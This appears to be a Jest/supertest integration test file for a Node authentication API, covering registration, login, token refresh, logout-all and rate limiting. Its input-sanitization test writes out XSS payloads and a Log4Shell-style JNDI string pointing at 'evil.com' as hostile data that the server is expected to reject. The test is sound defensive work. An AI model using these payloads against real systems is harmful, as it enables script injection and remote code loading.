import request from 'supertest';
import app from '../../src/server';
import { PrismaClient } from '@prisma/client';
import bcrypt from 'bcryptjs';

const prisma = new PrismaClient();

describe('Auth Integration Tests', () => {
  let testUser: any;
  let accessToken: string;
  let refreshTokenCookie: string;

  beforeAll(async () => {
    await prisma.refreshToken.deleteMany({});
    await prisma.user.deleteMany({
      where: { email: { contains: 'test' } }
    });
  });

  afterAll(async () => {
    await prisma.refreshToken.deleteMany({});
    await prisma.user.deleteMany({
      where: { email: { contains: 'test' } }
    });
    await prisma.$disconnect();
  });

  describe('Complete Auth Flow', () => {
    it('should complete full registration -> login -> profile -> logout flow', async () => {
      const registrationData = {
        email: 'integration@test.com',
        password: 'Password123!',
        firstName: 'Integration',
        lastName: 'Test',
      };

      const registerResponse = await request(app)
        .post('/api/v1/auth/register')
        .send(registrationData);

      expect(registerResponse.status).toBe(201);
      expect(registerResponse.body.success).toBe(true);
      expect(registerResponse.body.data.user.email).toBe(registrationData.email);
      
      const setCookieHeader = registerResponse.headers['set-cookie'];
      refreshTokenCookie = setCookieHeader.find((cookie: string) => 
        cookie.startsWith('refreshToken=')
      );
      
      accessToken = registerResponse.body.data.tokens.accessToken;
      testUser = registerResponse.body.data.user;

      const profileResponse = await request(app)
        .get('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${accessToken}`);

      expect(profileResponse.status).toBe(200);
      expect(profileResponse.body.data.user.email).toBe(registrationData.email);

      const updateData = {
        firstName: 'UpdatedName',
        phoneNumber: '+1234567890',
      };

      const updateResponse = await request(app)
        .put('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${accessToken}`)
        .send(updateData);

      expect(updateResponse.status).toBe(200);
      expect(updateResponse.body.data.user.firstName).toBe('UpdatedName');
      expect(updateResponse.body.data.user.phoneNumber).toBe('+1234567890');

      const changePasswordResponse = await request(app)
        .post('/api/v1/auth/change-password')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({
          currentPassword: 'Password123!',
          newPassword: 'NewPassword123!',
        });

      expect(changePasswordResponse.status).toBe(200);
      expect(changePasswordResponse.body.success).toBe(true);

      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: registrationData.email,
          password: 'NewPassword123!',
        });

      expect(loginResponse.status).toBe(200);
      expect(loginResponse.body.success).toBe(true);

      const newAccessToken = loginResponse.body.data.tokens.accessToken;
      const newRefreshCookie = loginResponse.headers['set-cookie'].find((cookie: string) => 
        cookie.startsWith('refreshToken=')
      );

      const logoutResponse = await request(app)
        .post('/api/v1/auth/logout')
        .set('Cookie', newRefreshCookie);

      expect(logoutResponse.status).toBe(200);
      expect(logoutResponse.body.success).toBe(true);

      const verifyResponse = await request(app)
        .get('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${newAccessToken}`);

      expect(verifyResponse.status).toBe(401);
    });

    it('should handle refresh token flow correctly', async () => {
      const userData = {
        email: 'refresh@test.com',
        password: 'Password123!',
      };

      const registerResponse = await request(app)
        .post('/api/v1/auth/register')
        .send(userData);

      const initialRefreshCookie = registerResponse.headers['set-cookie'].find((cookie: string) => 
        cookie.startsWith('refreshToken=')
      );

      const refreshResponse = await request(app)
        .post('/api/v1/auth/refresh')
        .set('Cookie', initialRefreshCookie);

      expect(refreshResponse.status).toBe(200);
      expect(refreshResponse.body.success).toBe(true);
      expect(refreshResponse.body.data.tokens.accessToken).toBeDefined();

      const newAccessToken = refreshResponse.body.data.tokens.accessToken;
      const newRefreshCookie = refreshResponse.headers['set-cookie'].find((cookie: string) => 
        cookie.startsWith('refreshToken=')
      );

      const profileResponse = await request(app)
        .get('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${newAccessToken}`);

      expect(profileResponse.status).toBe(200);
      expect(profileResponse.body.data.user.email).toBe(userData.email);

      const oldRefreshResponse = await request(app)
        .post('/api/v1/auth/refresh')
        .set('Cookie', initialRefreshCookie);

      expect(oldRefreshResponse.status).toBe(401);
    });

    it('should handle remember me functionality', async () => {
      const loginData = {
        email: 'integration@test.com',
        password: 'NewPassword123!',
        rememberMe: true,
      };

      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send(loginData);

      expect(loginResponse.status).toBe(200);
      
      const refreshCookie = loginResponse.headers['set-cookie'].find((cookie: string) => 
        cookie.startsWith('refreshToken=')
      );
      
      expect(refreshCookie).toContain('Max-Age=2592000');

      const shortLoginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: loginData.email,
          password: loginData.password,
          rememberMe: false,
        });

      expect(shortLoginResponse.status).toBe(200);
      
      const shortRefreshCookie = shortLoginResponse.headers['set-cookie'].find((cookie: string) => 
        cookie.startsWith('refreshToken=')
      );
      
      expect(shortRefreshCookie).toContain('Max-Age=604800');
    });

    it('should handle multiple device logout', async () => {
      const loginData = {
        email: 'integration@test.com',
        password: 'NewPassword123!',
      };

      const device1Response = await request(app)
        .post('/api/v1/auth/login')
        .send(loginData);

      const device2Response = await request(app)
        .post('/api/v1/auth/login')
        .send(loginData);

      const device1Token = device1Response.body.data.tokens.accessToken;
      const device2Token = device2Response.body.data.tokens.accessToken;

      const profile1Response = await request(app)
        .get('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${device1Token}`);

      const profile2Response = await request(app)
        .get('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${device2Token}`);

      expect(profile1Response.status).toBe(200);
      expect(profile2Response.status).toBe(200);

      const logoutAllResponse = await request(app)
        .post('/api/v1/auth/logout-all')
        .set('Authorization', `Bearer ${device1Token}`);

      expect(logoutAllResponse.status).toBe(200);

      const device1Cookie = device1Response.headers['set-cookie'].find((cookie: string) => 
        cookie.startsWith('refreshToken=')
      );
      const device2Cookie = device2Response.headers['set-cookie'].find((cookie: string) => 
        cookie.startsWith('refreshToken=')
      );

      const refresh1Response = await request(app)
        .post('/api/v1/auth/refresh')
        .set('Cookie', device1Cookie);

      const refresh2Response = await request(app)
        .post('/api/v1/auth/refresh')
        .set('Cookie', device2Cookie);

      expect(refresh1Response.status).toBe(401);
      expect(refresh2Response.status).toBe(401);
    });
  });

  describe('Security Tests', () => {
    it('should reject requests with malformed tokens', async () => {
      const malformedTokens = [
        'Bearer invalid.token.format',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
        'Bearer not-even-close',
        'Bearer ',
        ''
      ];

      for (const token of malformedTokens) {
        const response = await request(app)
          .get('/api/v1/auth/profile')
          .set('Authorization', token);

        expect(response.status).toBe(401);
      }
    });

    it('should validate input sanitization', async () => {
      const maliciousInputs = {
        email: '<script>alert("xss")</script>@test.com',
        firstName: '<img src=x onerror=alert("xss")>',
        lastName: '${jndi:ldap://evil.com/a}',
        phoneNumber: '+1<script>alert("xss")</script>',
      };

      const response = await request(app)
        .post('/api/v1/auth/register')
        .send({
          ...maliciousInputs,
          password: 'ValidPass123!'
        });

      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
    });

    it('should enforce rate limiting', async () => {
      const requests = [];
      
      for (let i = 0; i < 10; i++) {
        requests.push(
          request(app)
            .post('/api/v1/auth/login')
            .send({
              email: 'test@test.com',
              password: 'wrongpassword'
            })
        );
      }

      const responses = await Promise.all(requests);
      
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });
});